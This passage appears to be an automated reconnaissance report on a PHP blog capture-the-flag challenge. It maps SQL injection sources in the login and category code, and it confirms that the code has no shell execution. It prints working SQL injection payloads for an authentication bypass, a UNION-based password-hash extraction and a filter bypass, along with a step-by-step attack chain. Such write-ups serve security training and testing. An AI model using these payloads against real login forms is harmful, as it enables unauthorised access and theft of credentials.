**Analysis:** Comprehensive search of all PHP files in `/app/html/` found **zero instances** of shell command execution functions:

- `exec()` - Not found
- `shell_exec()` - Not found
- `system()` - Not found
- `passthru()` - Not found
- `popen()` - Not found
- `proc_open()` - Not found
- Backticks (`) - Not found
- `pcntl_exec()` - Not found
- `eval()` - Not found (note: `eval()` can execute PHP code, not shell commands, but also not found)

**Files Analyzed:**
- `/app/html/index.php` (73 lines)
- `/app/html/admin.php` (59 lines)

**Conclusion:** Application does not execute shell commands with user input. No command injection attack surface exists.

### SQL Injection Sources

**Definition:** User-controllable input from network-accessible endpoints that reaches database query strings without proper sanitization or parameterization.

#### **SQL Injection Source #1: Admin Username (CRITICAL)**

**Input Origin:** HTTP POST parameter `username`

**Data Flow:**
1. **Entry Point:** `/app/html/admin.php`, Line 17
   ```php
   $username = $_POST['username'];
   ```
   - User submits login form with `username` parameter
   - No validation, sanitization, or type checking applied
   - Direct assignment to `$username` variable

2. **Database Query Construction:** `/app/html/admin.php`, Line 20
   ```php
   $sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
   ```
   - String concatenation into SQL query
   - No `mysqli_real_escape_string()` used
   - No prepared statements (`mysqli_prepare()`) used

3. **Query Execution:** `/app/html/admin.php`, Line 21
   ```php
   $result = $conn->query($sql);
   ```
   - Raw query executed directly
   - User input fully controls part of SQL statement

**Vulnerability Type:** SQL Injection (authentication bypass, data exfiltration)

**Sanitization Applied:** ❌ None

**Attack Vector:** POST request to `/admin.php` with malicious `username` value

**Example Payload:**
```bash
# Authentication bypass
username=admin' OR '1'='1' --

# UNION-based data extraction
username=' UNION SELECT password FROM admins WHERE username='admin' --

# Boolean-based blind SQL injection
username=admin' AND '1'='1
```

**Impact:** Complete authentication bypass, database enumeration, potential admin password hash extraction

---

#### **SQL Injection Source #2: Admin Password (PARTIAL)**

**Input Origin:** HTTP POST parameter `password`

**Data Flow:**
1. **Entry Point:** `/app/html/admin.php`, Line 18
   ```php
   $password = MD5($_POST['password']);
   ```
   - User submits login form with `password` parameter
   - MD5 hash applied (converts input to 32 hexadecimal characters)
   - Hash provides **partial protection** (output is always `[a-f0-9]{32}`)

2. **Database Query Construction:** `/app/html/admin.php`, Line 20
   ```php
   $sql = "SELECT id FROM admins WHERE username = '$username' AND password = '$password'";
   ```
   - MD5 hashed value concatenated into SQL query
   - String concatenation (not prepared statement)

3. **Query Execution:** `/app/html/admin.php`, Line 21
   ```php
   $result = $conn->query($sql);
   ```

**Vulnerability Type:** Weak cryptographic hashing (MD5 is broken), theoretical SQL injection (highly limited)

**Sanitization Applied:** Partial (MD5 hash constrains output format)

**Attack Vector:** POST request to `/admin.php` with password that produces specific MD5 hash

**Why Partially Protected:**
- MD5 output is always 32 hexadecimal characters (`[a-f0-9]{32}`)
- Cannot inject SQL metacharacters (quotes, semicolons) through MD5 output
- However, MD5 collision attacks or rainbow table lookups can crack passwords

**Example Attack (Weak Crypto, not SQL Injection):**
```bash
# Obtain MD5 hash via SQL injection in username field
username=' UNION SELECT password FROM admins WHERE username='admin' --

# Use rainbow table to crack: MD5('ONEverySecurePassword123!') = <hash>
# Login with: username=admin&password=ONEverySecurePassword123!
```

**Impact:** Password compromise via cryptographic weakness, not direct SQL injection

---

#### **SQL Injection Source #3: Category Parameter (DISABLED)**

**Input Origin:** HTTP GET parameter `category`

**Data Flow:**
1. **Entry Point:** `/app/html/index.php`, Line 37 (COMMENTED OUT)
   ```php
   #$category = isset($_GET['category']) ? $_GET['category'] : '';
   ```
   - **Status:** Feature disabled
   - This line is commented out in the source code

2. **Hardcoded Override:** `/app/html/index.php`, Line 38
   ```php
   $category = ""; #disable feature for this challenge
   ```
   - Category parameter forcibly set to empty string
   - User input from `?category=` parameter ignored

3. **Weak Filtering:** `/app/html/index.php`, Lines 42-43
   ```php
   if ($category == "Secret")
       $category = "";
   ```
   - Blacklist approach (only blocks exact string "Secret")
   - Easily bypassed with SQL injection payloads

4. **Database Query Construction:** `/app/html/index.php`, Line 46
   ```php
   if (!empty($category)) {
       $sql .= "and category = '" . $category . "' ";
   }
   ```
   - **Would be vulnerable** if feature were enabled
   - String concatenation into SQL WHERE clause
   - No sanitization

5. **Query Execution:** `/app/html/index.php`, Line 50
   ```php
   $result = $conn->query($sql);
   ```

**Vulnerability Type:** SQL Injection (data exfiltration, filter bypass) - **CURRENTLY NOT EXPLOITABLE**

**Sanitization Applied:** ❌ None (blacklist only blocks "Secret" string)

**Current Status:** Feature disabled at line 38; input parameter ignored

**Attack Vector (if enabled):**
```bash
# Bypass published=1 filter to see unpublished posts
GET /index.php?category=' OR published=0 OR '1'='1

# Extract all posts including Secret category
GET /index.php?category=' UNION SELECT * FROM posts WHERE category='Secret' --
```

**Impact (if enabled):** Access to unpublished posts containing flag, database enumeration

---

### Injection Source Summary Table

| Source | Parameter | Origin | File:Line | Dangerous Sink | Sanitization | Status | Severity |
|--------|-----------|--------|-----------|----------------|--------------|--------|----------|
| **SQL Injection** | `username` | POST body | admin.php:17 | SQL query (line 20) | ❌ None | **ACTIVE** | **CRITICAL** |
| **SQL Injection** | `password` | POST body | admin.php:18 | SQL query (line 20) | Partial (MD5) | **ACTIVE** | **HIGH** (weak crypto) |
| **SQL Injection** | `category` | GET parameter | index.php:37 | SQL query (line 46) | ❌ None | **DISABLED** | HIGH (if enabled) |

### Additional Security Observations

1. **No Prepared Statements:**
   - Zero instances of `mysqli_prepare()` or `mysqli_stmt_bind_param()` in codebase
   - All queries use string concatenation: `$sql = "SELECT ... WHERE field = '$input'"`
   - This pattern is **universally vulnerable** to SQL injection

2. **No Input Validation Framework:**
   - No calls to `filter_input()`, `filter_var()`, or similar functions
   - No validation of input types (string vs. int)
   - No length restrictions on inputs
   - No character whitelist/blacklist (except weak "Secret" check)

3. **Database Connection Security:**
   - Hardcoded credentials: `new mysqli('db', 'user', 'password', 'blogDB')`
   - No SSL/TLS encryption on database connection
   - Credentials visible in source code (/app/html/index.php:2, /app/html/admin.php:12)

4. **Error Disclosure:**
   ```php
   // index.php:52-53
   if ($result === false) {
       die("Error in query: " . $conn->error);
   }
   ```
   - SQL errors displayed to users
   - Reveals database structure and query details
   - Aids SQL injection exploitation

5. **No Output Encoding:**
   - Database content echoed directly to HTML without `htmlspecialchars()`
   - Stored XSS possible if database is poisoned via SQL injection
   - See `/app/html/index.php:59-62` (post title, category, content)

### Complete Injection Source Mapping

**SQL Injection Attack Chain:**

```
1. Attacker → HTTP Request
   ↓
2. POST /admin.php with username=' OR '1'='1' --
   ↓
3. PHP receives: $_POST['username'] = "' OR '1'='1' --"
   ↓
4. admin.php:17 → $username = $_POST['username']
   ↓
5. admin.php:20 → $sql = "SELECT id FROM admins WHERE username = '' OR '1'='1' --' AND password = '...'"
   ↓
6. admin.php:21 → $conn->query($sql)
   ↓
7. MySQL executes malicious query (always returns rows)
   ↓
8. admin.php:23 → $result->num_rows == 1 (check passes)
   ↓
9. admin.php:25 → $_SESSION['admin_logged_in'] = true
   ↓
10. admin.php:26 → echo "@FLAG@"
    ↓
11. Attacker receives flag (authentication bypassed)
```

**No Command Injection Attack Chain exists** (no shell execution functions in codebase)

---

## RECONNAISSANCE COMPLETE

This comprehensive reconnaissance deliverable provides a complete attack surface map for the PHP blog application. All subsequent analysis specialists (Injection, XSS, Auth, SSRF, Authz) can use this intelligence to identify and exploit vulnerabilities within their respective domains.

**Key Findings:**
- 2 network-accessible PHP endpoints
- 1 critical SQL injection vulnerability (active)
- 1 high-severity SQL injection vulnerability (disabled)
- Binary role system (anon → admin)
- Session-based authentication with multiple weaknesses
- No input validation or output encoding
- No prepared statements (all queries vulnerable)
- Weak cryptographic practices (MD5 password hashing)

**Priority Attack Vectors:**
1. SQL injection authentication bypass (admin.php:20)
2. Session fixation attack
3. Weak password hash cracking
4. Re-enabling category filter for secondary SQL injection